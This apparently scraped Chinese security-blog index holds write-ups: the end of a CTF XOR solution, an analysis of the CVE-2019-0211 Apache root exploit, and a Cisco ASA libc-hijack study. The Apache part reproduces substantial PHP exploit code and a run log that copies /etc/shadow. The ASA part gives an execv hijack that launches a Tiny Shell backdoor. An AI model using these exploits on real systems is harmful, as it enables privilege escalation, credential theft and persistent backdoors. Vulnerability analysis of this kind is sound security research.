SECT{1f_U_574y_r1gh7_wh3r3_U_R,_7h3n_p30pl3_w1ll_3v3n7u4lly_c0m3_70_U} ##方法二： 使用xortool 123456789101112131415161718192021222324$ xortool -b flag.txtThe most probable key lengths: 1: 28.3% 4: 23.4% 11: 18.4% 17: 9.2% 19: 7.4% 21: 4.8% 29: 3.5% 33: 1.8% 36: 1.7% 39: 1.5%Key-length can be 3*n256 possible key(s) of length 1:32107...Found 30 plaintexts with 95.0%+ printable charactersSee files filename-key.csv, filename-char_used-perc_printable.csv$ cd xortool_out &amp;&amp; strings * | grep SECTSECT{1f_U_574y_r1gh7_wh3r3_U_R,_7h3n_p30pl3_w1ll_3v3n7u4lly_c0m3_70_U}","link":"/post/b2bfb130.html"},{"title":"CVE-2019-0211——Apache HTTP组件提权漏洞利","text":"前段时间Apache HTTP 被发现存在本地提权漏洞（CVE-2019-0211），漏洞作者在第一时间就给出了WriteUp和漏洞EXP，当时做了这个漏洞的应急响应，事后也分析了一下该漏洞，在此将分析的笔记整理分享出来，希望对大家理解该漏洞有所帮助。本文内容主要按着EXP的执行步骤一步步讲解，同时详细解释了利用过程中几个比较难理解的点： PHP UAF漏洞的具体利用细节 all_buckets[bucket]是如何指向SHM中伪造的结构以及Heap Spray的问题 如何让apr_proc_mutex_t、zend_array、prefork_child_bucket和zend_object这些Apache和PHP的结构体在内存中相互叠加 漏洞成因作者的WriteUp中对导致漏洞代码已经有了介绍，这里就只是简单提一下，并省略了大部分的源码以减轻阅读负担。 在Apache的MPM prefork模式中，以root权限运行主服务器进程，同时管理一个低特权工作进程（worker）池，用于处理HTTP请求。主进程和worker之间通过一个共享内存（SHM）进行通信。 1.当Apache httpd服务器优雅重启（graceful）时，httpd主进程会杀死旧worker并用新worker替换它们，这就会调用prefork_run()函数产生新的worker： 12345678//server/mpm/prefork/prefork.cstatic int prefork_run(apr_pool_t *_pconf, apr_pool_t *plog, server_rec *s){ /* ... */ make_child(ap_server_conf, child_slot, ap_get_scoreboard_process(child_slot)-&gt;bucket); /* ... */} 2.在该函数中调用make_child()，并使用ap_get_scoreboard_process(child_slot)-&gt;bucket作为参数。make_child()函数会创建新的子进程，同时根据bucket索引读取all_buckets数组到my_bucket： 12345678//server/mpm/prefork/prefork.cstatic int make_child(server_rec *s, int slot, int bucket){ /* ... */ my_bucket = &amp;all_buckets[bucket]; /* ... */ child_main(slot, bucket); /* ... */ 3.调用child_main()，如果Apache侦听多个端口，那么SAFE_ACCEPT(&lt;code&gt;)宏中的&lt;code&gt;将会执行，在这里即是执行函数apr_proc_mutex_child_init()： 12345678//server/mpm/prefork/prefork.cstatic void child_main(int child_num_arg, int child_bucket){ /* ... */ status = SAFE_ACCEPT(apr_proc_mutex_child_init(&amp;my_bucket-&gt;mutex, apr_proc_mutex_lockfile(my_bucket-&gt;mutex), pchild)); /* ... */ 4.该函数进一步调用(*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname) 12345678//apr-1.7.0//locks/unix/proc_mutex.cAPR_DECLARE(apr_status_t) apr_proc_mutex_child_init(apr_proc_mutex_t **mutex, const char *fname, apr_pool_t *pool){ return (*mutex)-&gt;meth-&gt;child_init(mutex, pool, fname);} 整个简化的流程如下： 1234567prefork_run() make_child(bucket) my_bucket = &amp;all_buckets[bucket]; child_main(bucket) SAFE_ACCEPT(apr_proc_mutex_child_init) apr_proc_mutex_child_init(my_bucket-&gt;mutex) mutex-&gt;meth-&gt;child_init(&amp;my_bucket-&gt;mutex)//覆盖child_init()的指针来指向代码 如果我们在共享内存中伪造一个prefork_child_bucket结构（即all_buckets数组的元素），并修改all_buckets数组的索引bucket，就可以在第三行处的代码控制my_bucket指向该结构。 进而在后续代码执行my_bucket-&gt;mutex-&gt;meth-&gt;child_init(mutex, pool, fname)，meth结构包含指向多个函数的指针，因此，将其中的child_init函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的，并且此时进程还是处于root权限的，后面才降低自身的权限。 漏洞利用作者在其WriteUp将利用过程分为四个步骤，但实际的exp要比他写得更繁琐一点，在顺序上也稍微有些不同。以下是根据exp执行步骤整理的流程，补充了一些细节： 利用PHP读取worker的/proc/self/maps文件，进而定位一些漏洞利用所需模块和函数的地址 枚举/proc/*/cmdline和/proc/*/status文件，得到所有worker进程的PID 利用一个PHP的UAF漏洞，在worker进程中获取读/写SHM的权限 遍历Apache的内存，根据内存模式匹配找到与all_buckets数组地址 因为优雅重启后，all_buckets的位置会改变，因此需要计算一个”适当”的bucket索引，保证all_buckets[bucket]仍然指向伪造的prefork_child_bucket结构 在SHM中构造payload 喷射payload之后剩余的SHM区域，确保第5步中all_buckets[bucket]指向这片区域后，能转跳到payload 将process_score-&gt;bucket修改为第5步中计算的bucket。此外为了进一步提高成功率，还可以枚举SHM区域所有的process_score结构，将每个worker的process_score-&gt;pid与第2步得到的PID的相比较，匹配上的就是正确的process_score结构，将每个worker的process_score-&gt;bucket都进行修改。 等待Apache优雅重启触发漏洞（每天早上6:25会自动执行，也可手动重启验证结果） 具体的细节如下图： exp概述get_all_addresses()、get_workers_pids()函数分别取得几个关键内存地址、worker的PID放入全局变量$addresses和$worker_pids中，以便在随后的利用中使用。需要注意如果执行exp时无法解析shm和apache的地址，可能是因为你的环境中shm的大小与exp中查找的范围不一致，可以自己查看一下maps文件，然后修改if ($msize &gt;= 0x10000 &amp;&amp; $msize &lt;= 0x16000)这一行为正确的值即可。 real()函数有两个作用，一是触发PHP的UAF漏洞。二是开始真正的漏洞利用过程，因为Z中定义了jsonSerialize()方法，它会在类实例被序列化的时候调用，即后面执行json_encode()时调用，而所有的利用代码都在jsonSerialize()中。 下面的代码只保留了EXP的基本框架，只为了让大家有一个整体上的概念： 12345678910111213141516171819202122232425262728293031&lt;?phpfunction real(){ global $y; $y = [new Z()]; json_encode([0 =&gt; &amp;$y]);} class Z implements JsonSerializable{ public function jsonSerialize() { ... } ... } ...function get_all_addresses(){ ... } function get_workers_pids(){ ... } $addresses = get_all_addresses();$workers_pids = get_workers_pids();real(); 接下来具体看看jsonSerialize()中的代码。 利用PHP的UAF获取读写SHM的权限还是先概括的讲一讲PHP这个UAF漏洞原理： 1234567891011121314class Z implements JsonSerializable{ public function jsonSerialize() { global $y, $addresses, $workers_pids; ... $this-&gt;abc = ptr2str(0, 79); //ptr2str在这里等同于创建一个字符串 ... unset($y[0]); ... $x = new DateInterval('PT1S'); ... }} 我们在Z中定义了一个字符串$this-&gt;abc（PHP内部使用zend_string表示），就好比C中malloc一块内存 接着unset($y[0])（Z的实例），就像”free“掉刚才分配的内存 然后再请求分配一个和刚才释放大小相同的内存块，这里使用的是DateInterval（PHP的对象内部实现往往由几个结构体组成，这里其实是DateInterval中的timelib_rel_time和zend_string大小相同），于是DateInterval就占据了原来字符串的位置，如下图所示： 此时$this-&gt;abc仍然可用并指向原来的位置，于是我们可以通过修改DateInterval来控制字符串$this-&gt;abc。 PHP字符串的内部实现如下，用一个zend_string表示，通过成员变量len来判断字符串长度，从而实现二进制安全。我们修改DateInterval的属性间接修改len的大小就可以通过this-&gt;abc读写SHM区域了。当然，为了能够成功利用漏洞，还有许多细节需要考虑。 123456struct _zend_string { zend_refcounted gc; zend_ulong h; size_t len; char val[1];}; 填充空闲内存块在脚本运行之前可能发生了大量的分配/释放，因此同时实例化的两个变量也不一定是连续的，为解决这个问题，实例化几个DateInterval对象填充不连续空闲块，以确保后面分配的内存是连续的： 12345$contiguous = [];for($i=0;$i&lt;10;$i++) $contiguous[] = new DateInterval('PT1S');$_protector = ptr2str(0, 78); 创建保护内存块为了保证UAF后我们控制的结构属于一块空闲内存，如果我们之后创建其他变量，那么这些变量可能会破坏我们已经控制的结构，为了避免这种情况，这里分配了很多对象Z的实例，后面的代码中会将其释放，由于PHP的堆LIFO的特点，这些释放掉的内存会优先于UAF的那块内存分配，从而保护被我们控制的结构。123$room = [];for($i=0;$i&lt;10;$i++) $room[] = new Z(); 函数ptr2str的作用相当于在内存中分配一个大小为78的zend_string结构，为什么是78这个大小接下来会提到。1$_protector = ptr2str(0, 78); 分配UAF的字符串接着创建字符串$this-&gt;abc，也就是一个zend_string结构，通过对它进行UAF，进而读写共享内存。 12$this-&gt;abc = ptr2str(0, 79);$p = new DateInterval('PT1S'); 创建$p的目的是为了保护$this-&gt;abc，前面说过，一个PHP对象往往由许多结构组成，而DateInterval中的timelib_rel_time结构大小就刚好为78，这就是前面为何要创建大小78的zend_string的原因。 此时的内存布局如下图所示，这里和下面的所有图示都是为了方便大家理解，因为PHP各种变量、对象都是由好几个结构组成，所以实际的PHP堆内存排布肯定比此复杂。 触发UAF并验证接着unset当前对象$y[0]和$p，unset掉$p意味着释放了DateInterval的timelib_rel_time结构。 12unset($y[0]);unset($p); 此时内存布局如下： 然后我们将分配一个与其大小相同的字符串（$protector），由于PHP堆LIFO的特点，因此字符串将取代timelib_rel_time结构的位置。 12# Protect $p's timelib_rel_time structure$protector = \".$_protector\"; 接着就是最重要的一步： 1$x = new DateInterval('PT1S'); 再次创建一个DateInterval，它的timelib_rel_time结构将刚好占据上图中free的内存位置，同时$this-&gt;abc仍然是可以访问free这块内存的，即：&amp;timelib_rel_time == &amp;zend_string。因此我们可以通过修改DateInterval对象来修改zend_string.len，从而控制可以读/写内存的长度。 完成上述步骤后，我们还需要验证UAF是否成功，看一下DateInterval的定义： 12345678910111213141516DateInterval {/* Properties */public integer $y ;public integer $m ;public integer $d ;public integer $h ;public integer $i ;public integer $s ;public float $f ;public integer $invert ;public mixed $days ;/* Methods */public __construct ( string $interval_spec )public static createFromDateString ( string $time ) : DateIntervalpublic format ( string $format ) : string} 因为有&amp;timelib_rel_time == &amp;zend_string，所以这里的$d和$y分别对应zend_string里的len和val。可以将$x（DateInterval）的h属性设置为0x13121110，再通过$this-&gt;abc字符串（zend_string）访问来判断UAF成功与否。 12345678910111213141516171819# zend_string.refcount = 0$x-&gt;y = 0x00;# zend_string.len$x-&gt;d = 0x100;# zend_string.val[0-4]$x-&gt;h = 0x13121110;if(!( strlen($this-&gt;abc) === $x-&gt;d &amp;&amp; $this-&gt;abc[0] == \"\\x10\" &amp;&amp; $this-&gt;abc[1] == \"\\x11\" &amp;&amp; $this-&gt;abc[2] == \"\\x12\" &amp;&amp; $this-&gt;abc[3] == \"\\x13\")){ o('UAF failed, exiting.'); exit();} o('UAF successful.');; 最后别忘了释放掉$room，产生的空闲块将保护我们控制的结构，后面再新建变量都会优先使用这些内存。 1unset($room); 控制并修改UAF的结构利用这个PHP漏洞的目的是为了能够获取读写SHM的权限，现在我们能够读写zend_string.val的内容，能读写的长度是zend_string.len，因此只要将len的值增加到包括SHM的范围。 这时我们已经知道了SHM的绝对地址，还需要知道abc的绝对地址，得到两者之间的偏移量才可以修改len。因此需要找到字符串$this-&gt;abc在内存中的位置： 1234$address = str2ptr($this-&gt;abc, 0x70 * 2 - 24);$address = $address - 0x70 * 3;$address = $address + 24;o('Address of $abc: 0x' . dechex($address)); 然后我们就可以计算两者间的偏移量了，还要注意的是，因为后面我们需要在内存中查找all_bucket，而它在apache的内存中所以我们的len需要将SHM和apache的内存都覆盖到，所以作者的WriteUp中说SHM和apache的内存都需要在PHP堆之后，而它们也确实都在PHP堆之后。 找SHM和apache的内存两者间较大的值，减去abc的地址，将得到的偏移通过DateInterval的d属性修改来修改zend_string.len。 123$distance = max($addresses['apache'][1], $addresses['shm'][1]) - $address;$x-&gt;d = $distance; 这等同于将zend_string结构（$this-&gt;abc）中的len修改为一个超大的值，一直包括到SHM和Apache内存区域，这下我们就可以读写这个范围内的内存了。 在内存中定位all_buckets根据内存模式查找all_buckets数组的位置，这在作者的writeup中有提到。mutex在all_buckets偏移0x10的位置，而meth在mutex偏移0x8的位置，根据该特征查找all_buckets数组。 首先，在apache的内存中搜索all_buckets[idx]-&gt;mutex，接着验证meth，是否在libapr.so的.data段中，最后因为meth指向libapr.so中定义的函数，因此验证其是否在.text段。满足这些条件的就是我们要找的all_buckets[]结构。 123456789101112131415161718192021$all_buckets = 0;for( $i = $addresses['apache'][0] + 0x10; $i &lt; $addresses['apache'][1] - 0x08; $i += 8){ # mutex $mutex = $pointer = str2ptr($this-&gt;abc, $i - $address); if(!in($pointer, $addresses['apache'])) continue; # meth $meth = $pointer = str2ptr($this-&gt;abc, $pointer + 0x8 - $address); if(!in($pointer, $addresses['libaprR'])) continue; o(' [&amp;mutex]: 0x' . dechex($i)); o(' [mutex]: 0x' . dechex($mutex)); o(' [meth]: 0x' . dechex($meth)); 顺便将meth结构中所有函数指针打印出来，第6个就是我们要用到的(*child_init)()。 1234567891011121314151617 # meth-&gt;* # flags if(str2ptr($this-&gt;abc, $pointer - $address) != 0) continue; # methods for($j=0;$j&lt;7;$j++) { $m = str2ptr($this-&gt;abc, $pointer + 0x8 + $j * 8 - $address); if(!in($m, $addresses['libaprX'])) continue 2; o(' [*]: 0x' . dechex($m)); } $all_buckets = $i - 0x10; o('all_buckets = 0x' . dechex($all_buckets)); break;} 这是meth的结构，可以对照着看一看：12345678910struct apr_proc_mutex_unix_lock_methods_t { unsigned int flags; apr_status_t (*create)(apr_proc_mutex_t *, const char *); apr_status_t (*acquire)(apr_proc_mutex_t *); apr_status_t (*tryacquire)(apr_proc_mutex_t *); apr_status_t (*release)(apr_proc_mutex_t *); apr_status_t (*cleanup)(void *); apr_status_t (*child_init)(apr_proc_mutex_t **, apr_pool_t *, const char *); const char *name;}; 计算索引buckets再回忆一下漏洞利用的方法：在SHM中构造payload （prefork_child_bucket结构），同时将剩余SHM区域喷射payload地址（并非payload起始地址）， 控制指向喷射区域，所以&amp;all_buckets[bucket]中的meth必然指向payload ，而payload中我们已将child_init函数的指针覆盖为我们想要执行函数的指针，就可以达到漏洞利用的目的。 要想控制&amp;all_buckets[bucket]指向prefork_child_bucket结构，不能直接将该结构精确放在某个位置，然后直接计算两者间的偏移，因为all_buckets的地址在每优雅重启后会发生变化，所以漏洞被触发时all_buckets的地址将与我们找到的地址是不同的，这就是作者在EXP中进行堆喷的目的。 all_buckets是一个结构体数组，元素prefork_child_bucket结构由三个指针组成： 12345typedef struct prefork_child_bucket { ap_pod_t *pod; ap_listen_rec *listeners; apr_proc_mutex_t *mutex;} prefork_child_bucket; 如果在SHM中大量喷射一个指向payload的地址，只要让&amp;all_buckets[bucket]落在该区域内，payload就能得到执行，如下图中所示： 并且在EXP中，作者一共使用了两种方法来提高利用成功率： 喷射SHM，也就是上面提到的方法 修改每个worker的process_score-&gt;bucket结构，这样一来，利用成功率就可以再乘以Apache Worker的数量。这也是exp开始时调用$workers_pids = get_workers_pids();的原因。 先看第一种方法的实现： SHM的起始部分是被apache的各个进程使用的，可以用SHM末尾的绝对地址$spray_max，减去未使用的内存空间大小$spray_size，得到要喷射区域的大小$spray_size；而未使用空间的大小可以通过减去已使用worker_score结构的总大小得到。 123456$size_prefork_child_bucket = 24;$size_worker_score = 264;$spray_size = $size_worker_score * (256 - sizeof($workers_pids) * 2);$spray_max = $addresses['shm'][1];$spray_min = $spray_max - $spray_size; 然后找喷射区域地址的中间值，计算它和all_buckets地址的偏移，再除以prefork_child_bucket结构的大小，就可以得到一个all_buckets数组下标索引，但别忘了SHM在all_buckets之前，所以这个索引还要取负值，这个值用$bucket_index_middle表示。 12$spray_middle = (int) (($spray_min + $spray_max) / 2);$bucket_index_middle = (int) ( - ($all_buckets - $spray_middle) / $size_prefork_child_bucket ); 这样做的目的在于，在每优雅重启后，即便all_buckets的地址有所变化，&amp;all_buckets[bucket]指向的位置会在$spray_middle上下浮动，最大程度上保证了该指针落在喷射的内存范围内，如下图所示： 设置payload并喷射SHMPayload由三个部分组成 bucket，用来存放要执行的命令，这是因为payload已经成了几个结构的叠加。 meth，它还是apr_proc_mutex_unix_lock_methods_t结构，只是它的child_init替换成了zend_object_std_dtor，其他指针置空。 properties，这是PHP内部结构zend_object的一个成员。 回忆漏洞的攻击链，最后的child_init被替换成函数zend_object_std_dtor执行，其原型如下，传入一个zend_object结构： 1ZEND_API void zend_object_std_dtor(zend_object *object); 所以原本传给child_init的&amp;my_bucket-&gt;mutex（prefork_child_bucket结构的一部分）就和zend_object相叠加了。 zend_object_std_dtor的执行又导致以下调用链： 12345678910...mutex = &amp;my_bucket-&gt;mutexapr_proc_mutex_child_init(mutex) //(*mutex)-&gt;meth-&gt;child_init() (*mutex)-&gt;meth-&gt;zend_object_std_dtor(object) //[object = mutex] ht = object-&gt;properties zend_array_destroy(ht) zend_hash_destroy(ht) val = &amp;ht-&gt;arData[0]-&gt;val ht-&gt;pDestructor(val) 上面的代码properties是一个zend_array结构，如下所示，我们控制其中的arData，pDestructor，如果我们将上面&amp;ht-&gt;arData[0]-&gt;val放入要执行的命令，pDestructor()覆盖为system的地址，就可以实现命令执行了。 123456789101112struct _zend_array { zend_refcounted_h gc; //... uint32_t nTableMask; Bucket *arData; uint32_t nNumUsed; uint32_t nNumOfElements; uint32_t nTableSize; uint32_t nInternalPointer; zend_long nNextFreeElement; dtor_func_t pDestructor;}; 回到exp中，首先构造bucket部分，放入要执行的命令，没有参数时默认执行”chmod +s /usr/bin/python3.5”，但是自定义的命令长度也不能超过152字节。 12345678910111213141516171819202122# Build payload$payload_start = $spray_min - $size_worker_score;$z = ptr2str(0); # Payload maxsize 264 - 112 = 152 $bucket = isset($_REQUEST['cmd']) ? $_REQUEST['cmd'] : \"chmod +s /usr/bin/python3.5\"; if(strlen($bucket) &gt; $size_worker_score - 112) { o( 'Payload size is bigger than available space (' . ($size_worker_score - 112) . '), exiting.' ); exit(); } # Align $bucket = str_pad($bucket, $size_worker_score - 112, \"\\x00\"); 然后是meth，将原本child_init的指针改为zend_object_std_dtor： 1234567891011# apr_proc_mutex_unix_lock_methods_t $meth = $z . $z . $z . $z . $z . $z . # child_init ptr2str($addresses['zend_object_std_dtor']) ; 经过调试也可以看到child_init被覆盖： 然后是properties（zend_array和apr_proc_mutex_t结构的叠加），u-nTableMask的位置将用作apr_proc_mutex_t结构的meth，而arData指向payload中的bucket。 1234567891011121314151617181920 $properties = # refcount ptr2str(1) . # u-nTableMask meth ptr2str($payload_start + strlen($bucket)) . # Bucket arData ptr2str($payload_start) . # uint32_t nNumUsed; ptr2str(1, 4) . # uint32_t nNumOfElements; ptr2str(0, 4) . # uint32_t nTableSize ptr2str(0, 4) . # uint32_t nInternalPointer ptr2str(0, 4) . # zend_long nNextFreeElement $z . # dtor_func_t pDestructor ptr2str($addresses['system']); 将各部分组合：12345$payload = $bucket . $meth . $properties;通过前面UAF控制的字符串abc写入SHM未使用部分的开头：1234567891011o('Placing payload at address 0x' . dechex($payload_start));$p = $payload_start - $address;for( $i = 0; $i &lt; strlen($payload); $i++){ $this-&gt;abc[$p+$i] = $payload[$i];} 打印信息，将SHM剩下的部分喷射为properties的地址：12345678910111213141516171819202122$properties_address = $payload_start + strlen($bucket) + strlen($meth);o('Spraying pointer');o(' Address: 0x' . dechex($properties_address));o(' From: 0x' . dechex($spray_min));o(' To: 0x' . dechex($spray_max));o(' Size: 0x' . dechex($spray_size));o(' Covered: 0x' . dechex($spray_size * count($workers_pids)));o(' Apache: 0x' . dechex( $addresses['apache'][1] - $addresses['apache'][0]));$s_properties_address = ptr2str($properties_address);for( $i = $spray_min; $i &lt; $spray_max; $i++){ $this-&gt;abc[$i - $address] = $s_properties_address[$i % 8];} 讲到这里可以再回头看看文章刚开始的图，应该就更容易理解了。 进一步提高成功率前面还讲到，可以修改每个worker的process_score-&gt;bucket结构，这样一来，利用成功率就可以再乘以Apache Worker的数量，因为2.4中计算出的bucket索引能落在了SHM之外，如果有多个worker，如下图所示，就能提高&amp;all_buckets[bucket]落在SHM中的概率： 迭代查找每个process_score结构直到找到每个PID，再将找到的PID$workers_pids中的PID对比，匹配的就说明是正确的结构。 123456789101112131415161718$spray_nb_buckets = (int) ($spray_size / $size_prefork_child_bucket);$total_nb_buckets = $spray_nb_buckets * count($workers_pids);$bucket_index = $bucket_index_middle - (int) ($total_nb_buckets / 2); for( $p = $addresses['shm'][0] + 0x20; $p &lt; $addresses['shm'][1] &amp;&amp; count($workers_pids) &gt; 0; $p += 0x24 ) { $l = $p - $address; $current_pid = str2ptr($this-&gt;abc, $l, 4); o('Got PID: ' . $current_pid); # The PID matches one of the workers if(in_array($current_pid, $workers_pids)) { unset($workers_pids[$current_pid]); o(' PID matches'); 将所有workerprocess_score.bucket都进行修改，而非修改其中一个：123456789101112# Update bucket address$s_bucket_index = pack('l', $bucket_index);$this-&gt;abc[$l + 0x20] = $s_bucket_index[0];$this-&gt;abc[$l + 0x21] = $s_bucket_index[1];$this-&gt;abc[$l + 0x22] = $s_bucket_index[2];$this-&gt;abc[$l + 0x23] = $s_bucket_index[3];o(' Changed bucket value to ' . $bucket_index);$min = $spray_min - $size_prefork_child_bucket * $bucket_index;$max = $spray_max - $size_prefork_child_bucket * $bucket_index;o(' Ranges: 0x' . dechex($min) . ' - 0x' . dechex($max));# This bucket range is covered, go to the next one$bucket_index += $spray_nb_buckets; 到这里，整个漏洞利用过程就结束了，可以等到6:25AM查看利用是否利用成功，也可以手动执行apachectl graceful验证。 123456789101112131415if(count($workers_pids) &gt; 0){ o( 'Unable to find PIDs ' . implode(', ', $workers_pids) . ' in SHM, exiting.' ); exit();}o('');o('EXPLOIT SUCCESSFUL.');o('Await 6:25AM.');return 0; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182➜ curl http://192.168.116.133/carpediem.php\\?cmd\\=cp+/etc/shadow+/tmp/CARPE (DIEM) ~ CVE-2019-0211PID: 887Fetching addresses zend_object_std_dtor: 0x7fc38f605700 system: 0x7fc3936bc480 libaprX: 0x7fc393c39000-0x0x7fc393c6b000 libaprR: 0x7fc393e6b000-0x0x7fc393e6c000 shm: 0x7fc394456000-0x0x7fc39446a000 apache: 0x7fc39446a000-0x0x7fc39452a000Obtaining apache workers PIDs Found apache worker: 887 Found apache worker: 888 Found apache worker: 889 Found apache worker: 890 Found apache worker: 891Got 5 PIDs.Triggering UAF Creating room and filling empty spaces Allocating $abc and $p Unsetting both variables and setting $protector Creating DateInterval objectUAF successful.Address of $abc: 0x7fc38aaa34e8Looking for all_buckets in memory [&amp;mutex]: 0x7fc3944cab70 [mutex]: 0x7fc3944cacc0 [meth]: 0x7fc393e6bca0 [*]: 0x7fc393c53ce0 [*]: 0x7fc393c541b0 [*]: 0x7fc393c53e90 [*]: 0x7fc393c54210 [*]: 0x7fc393c53bf0 [*]: 0x7fc393c53960 [*]: 0x7fc393c6228call_buckets = 0x7fc3944cab60Computing potential bucket indexes and addresses[bucket_index_middle]: -17858Placing payload at address 0x7fc39445a148Spraying pointer Address: 0x7fc39445a218 From: 0x7fc39445a250 To: 0x7fc39446a000 Size: 0xfdb0 Covered: 0x4f470 Apache: 0xc0000Iterating in SHM to find PIDs...[spray_nb_bucket]: 2706[total_nb_buckets]: 13530[bucket_index]: -24623Got PID: 887 PID matches Changed bucket value to -24623 Ranges: 0x7fc3944ea6b8 - 0x7fc3944fa468Got PID: 888 PID matches Changed bucket value to -21917 Ranges: 0x7fc3944da908 - 0x7fc3944ea6b8Got PID: 889 PID matches Changed bucket value to -19211 Ranges: 0x7fc3944cab58 - 0x7fc3944da908Got PID: 890 PID matches Changed bucket value to -16505 Ranges: 0x7fc3944bada8 - 0x7fc3944cab58Got PID: 891 PID matches Changed bucket value to -13799 Ranges: 0x7fc3944aaff8 - 0x7fc3944bada8EXPLOIT SUCCESSFUL.Await 6:25AM. 参考资料[1] CVE-2019-0211 Apache Root Privilege Escalation[2] exploit[3] PHP7内核剖析","link":"/post/aab8343b.html"},{"title":"CVE-2014-3391——Cisco ASA防火墙libc hijack","text":"LD_LIBRARY_PATH环境变量会影响Loader的行为，它将告诉Loader在何处寻找共享库，并且其优先级高于系统默认加载路径。一般来说C程序链接其他.so文件时，查找库文件位置顺序如下： 1、编译时指定的位置2、LD_LIBRARY_PATH 指定的位置3、ldconfig 指定的位置4、/lib（Linux动态链接库常放的位置）5、/usr/lib（Linux动态链接库常放的位置） LD_LIBRARY_PATH一般用来对测试放置于非加载路径的库文件，但如果该变量设置不当，我们还可以使用它来实现so hijack。 Cisco ASA防火墙中8.x版本中就存在这样一个漏洞，该漏洞源于ASA启动脚本没有正确设置 LD_LIBRARY_PATH环境变量。可能允许经过身份验证的本地攻击者注入恶意库文件并完全控制系统。 准备工作 分析环境：Kali Linux 固件版本：ASA842-k8.bin 固件解包：取得Initial RAM Disk文件和Linux内核文件 系统模拟：通过QEMU模拟 glibc-2.9源码 Unix后门工具——[Tiny Shell][3] Cisco ASA启动过程分析Cisco ASA防火墙的底层是一个运行在x86/x86_64架构上的linux系统，并在防火墙上运行一个名为“lina”的程序，该程序实现了防火墙的全部业务功能。同时，还存在一个lina_monitor程序，负责主程序lina的启动和监控。从上图可以看到，/asa/script目录下的shell脚本rcS控制着lina_monitor的启动方式，在该脚本第一行，又执行了另一个脚本rcS.common，让我们一起来看看rcS.common的内容： 123456789101112131415161718192021222324252627282930313233343536373839sleep 7if [ ! -e /mnt/disk0 ]; then mkdir /mnt/disk0; fiif [ ! -e /mnt/disk1 ]; then mkdir /mnt/disk1; fimount=0partition=1for i in /sys/block/*d* ; do [ -x \"$i\" ] || continue device=${i#/sys/block/} devicepath=/dev/$device$partition mountpoint=/mnt/disk$mount dosfsck -a -V $devicepath echo \"dosfsck($devicepath) returned $?\" /asa/scripts/mount_flash.sh $devicepath $mountpoint 2&gt;/fserr || mount $devicepath $mountpoint 2&gt;&gt;/fserr || cat /fserr &gt;&amp;2 mount=$(($mount + 1))donerm -f /fserrmount -o remount,rw /dev/ram0 /tunctl &gt; /dev/nullmodprobe -q tipc 2&gt; /dev/nullifconfig tap0 127.0.2.2 up 2&gt; /dev/nulltipc-config -netid=1234 -a=1.1.1 -be eth:tap0 2&gt; /dev/null # tune the VM systemecho 2 &gt; /proc/sys/vm/overcommit_memoryecho 100 &gt; /proc/sys/vm/overcommit_ratioecho 0 &gt; /proc/sys/kernel/randomize_va_spaceulimit -s 1024 # set shmmax to 3156M which is MAX_GUEST_RAMecho 3309305856 &gt; /proc/sys/kernel/shmmax # kernel modules for environment monitoringmodprobe -q tscsync tscsync_major=129 2&gt; /dev/nullmodprobe -q msrif 2&gt; /dev/nullecho \"|/asa/bin/coredump_helper %e %p %s %t\" &gt; /proc/sys/kernel/core_pattern #Config cgroup./asa/scripts/cgroup_configecho \"export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/lib\" &gt;&gt; /tmp/run_cmd 而在rcS.common的最后一行，我们可以看到导致了漏洞的语句：1export LD_LIBRARY_PATH=/mnt/disk0/lib:/asa/lib:/mnt/disk0/csco_config/libLD_LIBRARY_PATH环境变量用于在程序加载运行查找共享库时，指定除了系统默认路径之外的其他路径，使用它可以通过自定义的库替换部分系统自带的C函数库。 在让我们回到rcS中，该脚本通过下面这行命令启动lina_monitor：1cgexec -g memory:privileged /asa/bin/lina_monitor -llina_monitor再以创建子进程的方式启动lina程序，并对lina进程进行监视和管控。至此，整个Cisco ASA防火墙启动完成，之后不会再有任何程序启动。关于Linux启动流程的具体细节，可以参见笔者的另一篇文章(还没有写)。 漏洞利用让我们再回顾一下前面流程中的关键点： LD_LIBRARY_PATH可以增加一个共享库搜索路径列表。并且先于系统默认加载路径。 rcS.common在LD_LIBRARY_PATH环境变量加入了路径/mnt/disk0/lib，而/mnt/disk0正是Cisco CLI的根目录。 那么该我们该劫持哪个库中的哪个函数呢？个人认为glibc中的execv()函数是较好的选择，原因有如下几点： 让我们再回过头看前面的启动流程图，/sbin/init执行之前的过程不用理会，因为init是第一个调用的链接glibc的程序，在此之前没有任何C程序执行。 在各个进程启动过程中，必定会调用exec函数 同时，在执行到rcS.common脚本时，所有系统守护进程都已启动完成，对execv()函数的修改不会对其造成影响 再回到启动流程图中，rcS执行完rcS.common后又执行了四个命令：echo、ulimit、cgexec和reboot，那么对execv()函数的修改是否会影响这四个命令呢?通过查看这四个程序（其中有三个程序是由busybox实现）的符号表，发现它们都未调用execv()函数，还是略有点运气的成分。总而言之，这样我们已经将对防火墙的影响降到最低。 编写劫持函数在Linux中，产生一个新进程的过程被分成了两个部分（相当于Windows中的CreateProcess）： 使用fork()函数创建一个新的子进程，此时子进程和父进程完全相同 使用exec函数将当前进程替换为要执行的进程，exec只是用另一个新程序替换了当前进程的上下文，数据，堆和栈段 Linux内核使exec函数（共有7个变体：execl、execlp、execle、execv、execvp、execve和fexecve）将程序从磁盘读入内存，并执行程序。在很多类Unix系统的实现中，这7个函数中只有execve是内核的系统调用，另外6个只是库函数，它们最终都要调用该系统调用。有关这部分的更详细内容可以参考APUE的进程控制一章。 所以我们可以考虑在的execv()中调用一个除execv之外的exec函数来避免产生递归调用。 通过IDA Pro反编译可以看到lina_monitor启动lina的过程 代码如下： 12345678910111213141516171819202122232425262728#include &lt;unistd.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt; const char *hijack_path = \"/mnt/disk0/tshd\"; //定义全局变量以便编译后修改路径const char *lina_path = \"/asa/bin/lina\";char *const hijack_argv[] = {\"tshd\",\"NULL\"};char *const reset_envp[] = {\"LD_LIBRARY_PATH=\",NULL};int execv (const char *path, char *const argv[]){ if (strcmp(path,lina_path) == 0) { pid_t pid; pid=fork(); if (pid &lt; 0) printf(\"****fork error****\"); else if (pid==0) //子进程 { __execve (hijack_path, hijack_argv, reset_envp); /* 在子进程中调用execve运行后门程序 reset_envp用于重置当前进程的环境变量， 以免后续操作继续链接劫持用的libc共享库 */ } return __execve (path, argv, reset_envp); } else //父进程 return __execve (path, argv, __environ);} 流程如下： 编译glibc-2.9 